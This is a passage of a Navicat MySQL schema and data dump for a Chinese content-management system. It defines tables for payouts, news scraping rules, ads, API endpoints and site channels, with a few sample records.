/*
 Navicat Premium Data Transfer

 Source Server         : 120.79.215.150
 Source Server Type    : MySQL
 Source Server Version : 50639
 Source Host           : 120.79.215.150
 Source Database       : tec2

 Target Server Type    : MySQL
 Target Server Version : 50639
 File Encoding         : utf-8

 Date: 10/23/2018 19:43:33 PM
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
--  Table structure for `jc_account_draw`
-- ----------------------------
DROP TABLE IF EXISTS `jc_account_draw`;
CREATE TABLE `jc_account_draw` (
  `account_draw_id` int(11) NOT NULL AUTO_INCREMENT,
  `draw_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '提现申请者',
  `apply_account` varchar(100) DEFAULT '' COMMENT '申请账户（微信号或支付宝账户）',
  `apply_amount` double NOT NULL DEFAULT '0' COMMENT '提现申请金额',
  `apply_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '处理状态(0申请中 1申请成功待支付 2申请失败 3提现成功)',
  `account_pay_id` int(11) DEFAULT NULL COMMENT '申请成功后支付ID',
  `apply_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '申请时间',
  PRIMARY KEY (`account_draw_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户账户提现申请';

-- ----------------------------
--  Table structure for `jc_account_pay`
-- ----------------------------
DROP TABLE IF EXISTS `jc_account_pay`;
CREATE TABLE `jc_account_pay` (
  `account_pay_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `draw_num` varchar(50) NOT NULL DEFAULT '' COMMENT '内部流水号',
  `pay_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '支付者',
  `draw_user_id` int(11) NOT NULL DEFAULT '0' COMMENT '提现者',
  `pay_account` varchar(100) NOT NULL DEFAULT '' COMMENT '支出账户',
  `draw_account` varchar(100) NOT NULL DEFAULT '' COMMENT '收入账户(微信账户名)',
  `pay_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '支付时间',
  `weixin_num` varchar(100) DEFAULT NULL COMMENT '微信流水号',
  `alipay_num` varchar(100) DEFAULT NULL COMMENT '支付宝流水号',
  PRIMARY KEY (`account_pay_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户账户提现支付';

-- ----------------------------
--  Table structure for `jc_acquisition`
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition`;
CREATE TABLE `jc_acquisition` (
  `acquisition_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  `type_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `acq_name` varchar(50) NOT NULL COMMENT '采集名称',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '停止时间',
  `status` int(11) NOT NULL DEFAULT '0' COMMENT '当前状态(0:静止;1:采集;2:暂停)',
  `curr_num` int(11) NOT NULL DEFAULT '0' COMMENT '当前号码',
  `curr_item` int(11) NOT NULL DEFAULT '0' COMMENT '当前条数',
  `total_item` int(11) NOT NULL DEFAULT '0' COMMENT '每页总条数',
  `pause_time` int(11) NOT NULL DEFAULT '0' COMMENT '暂停时间(毫秒)',
  `page_encoding` varchar(20) NOT NULL DEFAULT 'GBK' COMMENT '页面编码',
  `plan_list` longtext COMMENT '采集列表',
  `dynamic_addr` varchar(255) DEFAULT NULL COMMENT '动态地址',
  `dynamic_start` int(11) DEFAULT NULL COMMENT '页码开始',
  `dynamic_end` int(11) DEFAULT NULL COMMENT '页码结束',
  `linkset_start` varchar(255) DEFAULT NULL COMMENT '内容链接区开始',
  `linkset_end` varchar(255) DEFAULT NULL COMMENT '内容链接区结束',
  `link_start` varchar(255) DEFAULT NULL COMMENT '内容链接开始',
  `link_end` varchar(255) DEFAULT NULL COMMENT '内容链接结束',
  `title_start` varchar(255) DEFAULT NULL COMMENT '标题开始',
  `title_end` varchar(255) DEFAULT NULL COMMENT '标题结束',
  `keywords_start` varchar(255) DEFAULT NULL COMMENT '关键字开始',
  `keywords_end` varchar(255) DEFAULT NULL COMMENT '关键字结束',
  `description_start` varchar(255) DEFAULT NULL COMMENT '描述开始',
  `description_end` varchar(255) DEFAULT NULL COMMENT '描述结束',
  `content_start` varchar(255) DEFAULT NULL COMMENT '内容开始',
  `content_end` varchar(255) DEFAULT NULL COMMENT '内容结束',
  `pagination_start` varchar(255) DEFAULT NULL COMMENT '内容分页开始',
  `pagination_end` varchar(255) DEFAULT NULL COMMENT '内容分页结束',
  `queue` int(11) NOT NULL DEFAULT '0' COMMENT '队列',
  `repeat_check_type` varchar(20) NOT NULL DEFAULT 'NONE' COMMENT '重复类型',
  `img_acqu` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否采集图片',
  `content_prefix` varchar(255) DEFAULT NULL COMMENT '内容地址补全url',
  `img_prefix` varchar(255) DEFAULT NULL COMMENT '图片地址补全url',
  `view_start` varchar(255) DEFAULT NULL COMMENT '浏览量开始',
  `view_end` varchar(255) DEFAULT NULL COMMENT '浏览量结束',
  `view_id_start` varchar(255) DEFAULT NULL COMMENT 'id前缀',
  `view_id_end` varchar(255) DEFAULT NULL COMMENT 'id后缀',
  `view_link` varchar(255) DEFAULT NULL COMMENT '浏览量动态访问地址',
  `releaseTime_start` varchar(255) DEFAULT NULL COMMENT '发布时间开始',
  `releaseTime_end` varchar(255) DEFAULT NULL COMMENT '发布时间结束',
  `author_start` varchar(255) DEFAULT NULL COMMENT '作者开始',
  `author_end` varchar(255) DEFAULT NULL COMMENT '作者结束',
  `origin_start` varchar(255) DEFAULT NULL COMMENT '来源开始',
  `origin_end` varchar(255) DEFAULT NULL COMMENT '来源结束',
  `releaseTime_format` varchar(255) DEFAULT NULL COMMENT '发布时间格式',
  `origin_appoint` varchar(255) DEFAULT NULL COMMENT '指定来源',
  PRIMARY KEY (`acquisition_id`),
  KEY `fk_jc_acquisition_channel` (`channel_id`),
  KEY `fk_jc_acquisition_contenttype` (`type_id`),
  KEY `fk_jc_acquisition_site` (`site_id`),
  KEY `fk_jc_acquisition_user` (`user_id`),
  CONSTRAINT `fk_jc_acquisition_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_acquisition_contenttype` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`),
  CONSTRAINT `fk_jc_acquisition_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_acquisition_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS采集表';

-- ----------------------------
--  Records of `jc_acquisition`
-- ----------------------------
BEGIN;
INSERT INTO `jc_acquisition` VALUES ('1', '1', '75', '1', '1', '测试采集', null, null, '0', '0', '0', '0', '500', 'UTF-8', 'http://roll.news.sina.com.cn/s/channel.php?ch=01#col=91&spec=&type=&ch=01&k=&offset_page=0&offset_num=0&num=60&asc=&page=3', '', '2', '10', '<div class=\"d_list_txt\" id=\"d_list\">', '<div class=\"pagebox\">', '<span class=\"c_tit\"><a href=\"', '\" target=\"_blank\">', '<meta property=\"og:title\" content=\"', '\" />', null, null, '', '', '<div class=\"article article_16\" id=\"artibody\">', '<p class=\"article-editor\">', null, null, '0', 'NONE', '0', '', '', '', '', '', '', '', '', '', '', '', '', '', 'yyyy-MM-dd HH:mm:ss', '');
COMMIT;

-- ----------------------------
--  Table structure for `jc_acquisition_history`
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition_history`;
CREATE TABLE `jc_acquisition_history` (
  `history_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_url` varchar(255) NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `description` varchar(20) NOT NULL DEFAULT '' COMMENT '描述',
  `acquisition_id` int(11) DEFAULT NULL COMMENT '采集源',
  `content_id` int(11) DEFAULT NULL COMMENT '内容',
  PRIMARY KEY (`history_id`),
  KEY `fk_acquisition_history_acquisition` (`acquisition_id`),
  CONSTRAINT `fk_jc_history_acquisition` FOREIGN KEY (`acquisition_id`) REFERENCES `jc_acquisition` (`acquisition_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采集历史记录表';

-- ----------------------------
--  Table structure for `jc_acquisition_temp`
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition_temp`;
CREATE TABLE `jc_acquisition_temp` (
  `temp_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL,
  `channel_url` varchar(255) NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `finish_percent` int(3) NOT NULL DEFAULT '0' COMMENT '百分比',
  `description` varchar(20) NOT NULL DEFAULT '' COMMENT '描述',
  `seq` int(3) NOT NULL DEFAULT '0' COMMENT '顺序',
  PRIMARY KEY (`temp_id`),
  KEY `fk_jc_temp_site` (`site_id`),
  CONSTRAINT `fk_jc_temp_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采集进度临时表';

-- ----------------------------
--  Table structure for `jc_advertising`
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising`;
CREATE TABLE `jc_advertising` (
  `advertising_id` int(11) NOT NULL AUTO_INCREMENT,
  `adspace_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) NOT NULL COMMENT '广告名称',
  `category` varchar(50) NOT NULL COMMENT '广告类型',
  `ad_code` longtext COMMENT '广告代码',
  `ad_weight` int(11) NOT NULL DEFAULT '1' COMMENT '广告权重',
  `display_count` bigint(20) NOT NULL DEFAULT '0' COMMENT '展现次数',
  `click_count` bigint(20) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `start_time` date DEFAULT NULL COMMENT '开始时间',
  `end_time` date DEFAULT NULL COMMENT '结束时间',
  `is_enabled` char(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`advertising_id`),
  KEY `fk_jc_advertising_site` (`site_id`),
  KEY `fk_jc_space_advertising` (`adspace_id`),
  CONSTRAINT `fk_jc_advertising_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_space_advertising` FOREIGN KEY (`adspace_id`) REFERENCES `jc_advertising_space` (`adspace_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS广告表';

-- ----------------------------
--  Records of `jc_advertising`
-- ----------------------------
BEGIN;
INSERT INTO `jc_advertising` VALUES ('1', '1', '1', 'www.honghe.com', 'text', null, '1', '0', '0', null, null, '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_advertising_attr`
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising_attr`;
CREATE TABLE `jc_advertising_attr` (
  `advertising_id` int(11) NOT NULL,
  `attr_name` varchar(50) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_params_advertising` (`advertising_id`),
  CONSTRAINT `fk_jc_params_advertising` FOREIGN KEY (`advertising_id`) REFERENCES `jc_advertising` (`advertising_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS广告属性表';

-- ----------------------------
--  Records of `jc_advertising_attr`
-- ----------------------------
BEGIN;
INSERT INTO `jc_advertising_attr` VALUES ('1', 'text_title', 'www.honghe.com'), ('1', 'text_target', '_blank'), ('1', 'text_link', 'http://www.honghe.com');
COMMIT;

-- ----------------------------
--  Table structure for `jc_advertising_space`
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising_space`;
CREATE TABLE `jc_advertising_space` (
  `adspace_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) NOT NULL COMMENT '名称',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `is_enabled` char(1) NOT NULL COMMENT '是否启用',
  PRIMARY KEY (`adspace_id`),
  KEY `fk_jc_adspace_site` (`site_id`),
  CONSTRAINT `fk_jc_adspace_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS广告版位表';

-- ----------------------------
--  Records of `jc_advertising_space`
-- ----------------------------
BEGIN;
INSERT INTO `jc_advertising_space` VALUES ('1', '1', '1', '111', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_api_account`
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_account`;
CREATE TABLE `jc_api_account` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_id` varchar(255) NOT NULL DEFAULT '' COMMENT 'appId',
  `app_key` varchar(255) NOT NULL DEFAULT '' COMMENT 'appKey',
  `aes_key` varchar(100) NOT NULL DEFAULT '' COMMENT 'AES加解密密钥',
  `disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `iv_key` varchar(50) NOT NULL DEFAULT '' COMMENT 'AES iv key',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='API应用账户';

-- ----------------------------
--  Table structure for `jc_api_info`
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_info`;
CREATE TABLE `jc_api_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `api_name` varchar(255) NOT NULL DEFAULT '' COMMENT '接口名称',
  `api_url` varchar(255) NOT NULL DEFAULT '' COMMENT '接口URL',
  `api_code` varchar(50) NOT NULL DEFAULT '' COMMENT '接口代码',
  `disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `limit_call_day` int(11) NOT NULL DEFAULT '0' COMMENT '每日限制调用次数(0无限制)',
  `call_total_count` int(11) NOT NULL DEFAULT '0' COMMENT '总调用次数',
  `call_month_count` int(11) NOT NULL DEFAULT '0' COMMENT '月调用次数',
  `call_week_count` int(11) NOT NULL DEFAULT '0' COMMENT '周调用次数',
  `call_day_count` int(11) NOT NULL DEFAULT '0' COMMENT '日调用次数',
  `last_call_time` timestamp NULL DEFAULT NULL COMMENT '最后一次调用时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=77 DEFAULT CHARSET=utf8 COMMENT='API接口信息';

-- ----------------------------
--  Records of `jc_api_info`
-- ----------------------------
BEGIN;
INSERT INTO `jc_api_info` VALUES ('1', '栏目列表', '/api/channel/list.jspx', '010101', '0', '0', '0', '0', '0', '0', null), ('2', '单个栏目', '/api/channel/get.jspx', '010102', '0', '0', '0', '0', '0', '0', null), ('3', '新增栏目', '/api/channel/save.jspx', '010103', '0', '0', '0', '0', '0', '0', null), ('4', '修改栏目', '/api/channel/update.jspx', '010104', '0', '0', '0', '0', '0', '0', null), ('5', '内容列表', '/api/content/list.jspx', '010201', '0', '0', '0', '0', '0', '0', null), ('6', '内容获取', '/api/content/get.jspx', '010202', '0', '0', '0', '0', '0', '0', null), ('7', '我的内容', '/api/content/mycontents.jspx', '010203', '0', '0', '0', '0', '0', '0', null), ('8', '新增内容', '/api/content/save.jspx', '010204', '0', '0', '0', '0', '0', '0', null), ('9', '修改内容', '/api/content/update.jspx', '010205', '0', '0', '0', '0', '0', '0', null), ('10', '删除内容到回收站', '/api/content/del.jspx', '010206', '0', '0', '0', '0', '0', '0', null), ('11', '还原内容', '/api/content/recycle.jspx', '010207', '0', '0', '0', '0', '0', '0', null), ('12', '审核内容', '/api/content/check.jspx', '010208', '0', '0', '0', '0', '0', '0', null), ('13', '退回内容', '/api/content/reject.jspx', '010209', '0', '0', '0', '0', '0', '0', null), ('14', '顶内容', '/api/content/up.jspx', '010210', '0', '0', '0', '0', '0', '0', null), ('15', '踩内容', '/api/content/down.jspx', '010211', '0', '0', '0', '0', '0', '0', null), ('16', '内容购买', '/api/content/buy.jspx', '010212', '0', '0', '0', '0', '0', '0', null), ('17', '内容打赏', '/api/content/reward.jspx', '010213', '0', '0', '0', '0', '0', '0', null), ('18', '内容收藏', '/api/content/collect.jspx', '010301', '0', '0', '0', '0', '0', '0', null), ('19', '我的收藏', '/api/content/mycollect.jspx', '010302', '0', '0', '0', '0', '0', '0', null), ('20', '专题列表', '/api/topic/list.jspx', '010401', '0', '0', '0', '0', '0', '0', null), ('21', '专题获取', '/api/topic/get.jspx', '010402', '0', '0', '0', '0', '0', '0', null), ('22', '专题保存', '/api/topic/save.jspx', '010403', '0', '0', '0', '0', '0', '0', null), ('23', '专题修改', '/api/topic/update.jspx', '040404', '0', '0', '0', '0', '0', '0', null), ('24', '全文检索', '/api/content/search.jspx', '010501', '0', '0', '0', '0', '0', '0', null), ('25', 'Tag列表', '/api/contenttag/list.jspx', '010601', '0', '0', '0', '0', '0', '0', null), ('26', '热词列表', '/api/searchword/list.jspx', '010701', '0', '0', '0', '0', '0', '0', null), ('27', '友情链接列表', '/api/friendlink/list.jspx', '010801', '0', '0', '0', '0', '0', '0', null), ('28', '友情链接分类列表', '/api/friendlinkctg/list.jspx', '010802', '0', '0', '0', '0', '0', '0', null), ('29', '广告列表', '/api/ad/list.jspx', '010901', '0', '0', '0', '0', '0', '0', null), ('30', '广告分类列表', '/api/adctg/list.jspx', '010902', '0', '0', '0', '0', '0', '0', null), ('31', '单广告获取', '/api/ad/get.jspx', '010903', '0', '0', '0', '0', '0', '0', null), ('32', '评论列表', '/api/comment/list.jspx', '011001', '0', '0', '0', '0', '0', '0', null), ('33', '单评论获取', '/api/comment/get.jspx', '011002', '0', '0', '0', '0', '0', '0', null), ('34', '发布评论', '/api/comment/save.jspx', '011003', '0', '0', '0', '0', '0', '0', null), ('35', '评论顶', '/comment_up.jspx', '011004', '0', '0', '0', '0', '0', '0', null), ('36', '评论踩', '/comment_down.jspx', '011005', '0', '0', '0', '0', '0', '0', null), ('37', '我的评论', '/api/comment/mylist.jspx', '011006', '0', '0', '0', '0', '0', '0', null), ('38', '留言列表', '/api/guestbook/list.jspx', '011101', '0', '0', '0', '0', '0', '0', null), ('39', '我的留言', '/api/guestbook/mylist.jspx', '011102', '0', '0', '0', '0', '0', '0', null), ('40', '留言分类列表', '/api/guestbookctg/list.jspx', '011103', '0', '0', '0', '0', '0', '0', null), ('41', '单留言获取', '/api/guestbook/get.jspx', '011104', '0', '0', '0', '0', '0', '0', null), ('42', '发布留言', '/api/guestbook/save.jspx', '011105', '0', '0', '0', '0', '0', '0', null), ('43', '投票列表', '/api/vote/list.jspx', '011201', '0', '0', '0', '0', '0', '0', null), ('44', '单个投票', '/api/vote/get.jspx', '011202', '0', '0', '0', '0', '0', '0', null), ('45', '投票', '/api/vote/save.jspx', '011203', '0', '0', '0', '0', '0', '0', null), ('46', '新增会员', '/api/user/add.jspx', '011301', '0', '0', '0', '0', '0', '0', null), ('47', '会员修改资料', '/api/user/edit.jspx', '011302', '0', '0', '0', '0', '0', '0', null), ('48', '用户修改密码', '/api/user/pwd.jspx', '011303', '0', '0', '0', '0', '0', '0', null), ('49', '读取用户信息', '/api/user/get.jspx', '011304', '0', '0', '0', '0', '0', '0', null), ('50', '用户名唯一性检查', '/username_unique.jspx', '011305', '0', '0', '0', '0', '0', '0', null), ('51', '字典列表', '/api/dictionary/list.jspx', '011401', '0', '0', '0', '0', '0', '0', null), ('52', '我的职位申请', '/api/resume/myapplys.jspx', '011501', '0', '0', '0', '0', '0', '0', null), ('53', '申请职位', '/api/resume/apply.jspx', '011502', '0', '0', '0', '0', '0', '0', null), ('54', '撤销申请', '/api/resume/cancelApply.jspx', '011503', '0', '0', '0', '0', '0', '0', null), ('55', '查看我的简历', '/api/resume/get.jspx', '011601', '0', '0', '0', '0', '0', '0', null), ('56', '修改简历', '/api/resume/update.jspx', '011602', '0', '0', '0', '0', '0', '0', null), ('57', '站内信列表', '/api/message/list.jspx', '011701', '0', '0', '0', '0', '0', '0', null), ('58', '站内信单信息获取', '/api/message/get.jspx', '011702', '0', '0', '0', '0', '0', '0', null), ('59', '站内信息发送', '/api/message/send.jspx', '011703', '0', '0', '0', '0', '0', '0', null), ('60', '站内信草稿修改', '/api/message/draftUpdate.jspx', '011703', '0', '0', '0', '0', '0', '0', null), ('61', '站内信草稿发送', '/api/message/draftToSend.jspx', '011704', '0', '0', '0', '0', '0', '0', null), ('62', '删除站内信到回收站', '/api/message/trash.jspx', '011705', '0', '0', '0', '0', '0', '0', null), ('63', '还原站内信息', '/api/message/revert.jspx', '011706', '0', '0', '0', '0', '0', '0', null), ('64', '删除站内信', '/api/message/delete.jspx', '011707', '0', '0', '0', '0', '0', '0', null), ('65', '上传文件', '/api/upload/o_upload.jspx', '011801', '0', '0', '0', '0', '0', '0', null), ('66', '上传文库文档', '/api/upload/o_upload_doc.jspx', '011802', '0', '0', '0', '0', '0', '0', null), ('67', '内容打赏记录', '/api/order/getByContent.jspx', '011901', '0', '0', '0', '0', '0', '0', null), ('68', '我的消费记录和我的订单', '/api/order/myorders.jspx', '011902', '0', '0', '0', '0', '0', '0', null), ('69', '收益统计', '/api/order/chargelist.jspx', '011903', '0', '0', '0', '0', '0', '0', null), ('70', '提现申请', '/api/draw/apply.jspx', '011904', '0', '0', '0', '0', '0', '0', null), ('71', '删除提现申请', '/api/draw/delete.jspx', '011905', '0', '0', '0', '0', '0', '0', null), ('72', '提现申请列表', '/api/draw/list.jspx', '011906', '0', '0', '0', '0', '0', '0', null), ('73', '个人账户信息获取', '/api/account/get.jspx', '011907', '0', '0', '0', '0', '0', '0', null), ('74', '登陆', '/api/user/login.jspx', '012001', '0', '0', '0', '0', '0', '0', null), ('75', '退出', '/api/user/logout.jspx', '012002', '0', '0', '0', '0', '0', '0', null), ('76', '用户状态检查', '/api/user/getStatus.jspx', '012003', '0', '0', '0', '0', '0', '0', null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_api_record`
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_record`;
CREATE TABLE `jc_api_record` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `api_account` int(11) NOT NULL DEFAULT '0' COMMENT '调用的账户',
  `call_ip` varchar(255) DEFAULT '' COMMENT '调用的IP',
  `api_info_id` int(11) DEFAULT '0' COMMENT '接口',
  `api_call_time` datetime NOT NULL COMMENT '调用时间',
  `call_time_stamp` bigint(20) NOT NULL DEFAULT '0' COMMENT '调用的时间戳',
  `sign` varchar(100) NOT NULL DEFAULT '' COMMENT '签名数据(不允许重复调用)',
  PRIMARY KEY (`id`),
  KEY `fk_api_record_account` (`api_account`),
  KEY `fk_api_info` (`api_info_id`),
  KEY `index_jc_api_record_sign` (`sign`),
  CONSTRAINT `fk_api_info` FOREIGN KEY (`api_info_id`) REFERENCES `jc_api_info` (`id`),
  CONSTRAINT `fk_api_record_account` FOREIGN KEY (`api_account`) REFERENCES `jc_api_account` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='API调用记录';

-- ----------------------------
--  Table structure for `jc_api_user_login`
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_user_login`;
CREATE TABLE `jc_api_user_login` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `session_key` varchar(100) DEFAULT '' COMMENT 'sesssionKey',
  `username` varchar(255) NOT NULL DEFAULT '' COMMENT '用户名',
  `login_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '登陆时间',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登陆次数',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='API用户登录表';

-- ----------------------------
--  Table structure for `jc_channel`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel`;
CREATE TABLE `jc_channel` (
  `channel_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `parent_id` int(11) DEFAULT NULL COMMENT '父栏目ID',
  `channel_path` varchar(30) DEFAULT NULL COMMENT '访问路径',
  `lft` int(11) NOT NULL DEFAULT '1' COMMENT '树左边',
  `rgt` int(11) NOT NULL DEFAULT '2' COMMENT '树右边',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有内容',
  `is_display` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `workflow_id` int(11) DEFAULT NULL COMMENT '工作流id',
  PRIMARY KEY (`channel_id`),
  KEY `fk_jc_channel_model` (`model_id`),
  KEY `fk_jc_channel_parent` (`parent_id`),
  KEY `fk_jc_channel_site` (`site_id`),
  KEY `index_jc_channel_lft` (`lft`),
  KEY `index_jc_channel_rgt` (`rgt`),
  CONSTRAINT `fk_jc_channel_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`),
  CONSTRAINT `fk_jc_channel_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_channel_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=105 DEFAULT CHARSET=utf8 COMMENT='CMS栏目表';

-- ----------------------------
--  Records of `jc_channel`
-- ----------------------------
BEGIN;
INSERT INTO `jc_channel` VALUES ('75', '1', '1', null, 'gzdt', '1', '2', '8', '1', '1', null), ('76', '1', '1', null, 'tpxw_wy', '3', '4', '12', '1', '0', '1'), ('77', '6', '1', null, 'video', '5', '6', '12', '1', '0', null), ('78', '4', '1', null, 'download', '7', '16', '12', '1', '0', null), ('79', '8', '1', null, 'job', '17', '18', '12', '1', '0', null), ('80', '2', '1', null, 'survey', '19', '20', '11', '0', '0', null), ('81', '9', '1', null, 'doc', '21', '22', '12', '1', '0', null), ('82', '2', '1', null, 'message', '23', '24', '12', '0', '0', null), ('90', '4', '1', '78', 'xtrj', '8', '9', '10', '1', '1', null), ('91', '4', '1', '78', 'mtzs', '10', '11', '10', '1', '1', null), ('92', '4', '1', '78', 'jptj', '12', '13', '9', '1', '1', null), ('93', '4', '1', '78', 'yxyl', '14', '15', '10', '1', '1', null), ('94', '1', '1', null, 'ggtz', '25', '26', '10', '1', '1', null), ('95', '1', '1', null, 'zhwd', '27', '28', '10', '1', '1', null), ('96', '4', '1', null, 'rjzx', '29', '30', '10', '1', '1', null), ('97', '1', '1', null, 'dtgz', '31', '32', '10', '1', '1', null), ('98', '1', '1', null, 'sjjc', '33', '34', '10', '1', '1', null), ('99', '1', '1', null, 'pxgl', '35', '36', '10', '1', '1', null), ('100', '1', '1', null, 'kjcg', '37', '38', '10', '1', '1', null), ('101', '1', '1', null, 'khsj', '39', '40', '10', '1', '1', null), ('102', '1', '1', null, 'xmgl', '41', '42', '10', '1', '1', null), ('103', '1', '1', null, 'ywgl', '43', '44', '10', '1', '1', null), ('104', '1', '1', null, 'tpxw', '45', '46', '9', '1', '1', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_channel_attr`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_attr`;
CREATE TABLE `jc_channel_attr` (
  `channel_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_channel` (`channel_id`),
  CONSTRAINT `fk_jc_attr_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目扩展属性表';

-- ----------------------------
--  Table structure for `jc_channel_count`
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_count`;
CREATE TABLE `jc_channel_count` (
  `channel_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT '0' COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT '0' COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `content_count_total` int(11) NOT NULL DEFAULT '0' COMMENT '内容发布数',
  `content_count_day` int(11) NOT NULL DEFAULT '0' COMMENT '内容今日发布数',
  `content_count_week` int(11) NOT NULL DEFAULT '0' COMMENT '内容本周发布数',
  `content_count_month` int(11) NOT NULL DEFAULT '0' COMMENT '内容本月发布数',
  `content_count_year` int(11) NOT NULL DEFAULT '0' COMMENT '内容今年发布数',
  PRIMARY KEY (`channel_id`),
  CONSTRAINT `fk_jc_count_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目访问量计数表';

-- ----------------------------
--  Records of `jc_channel_count`
-- ----------------------------
BEGIN;
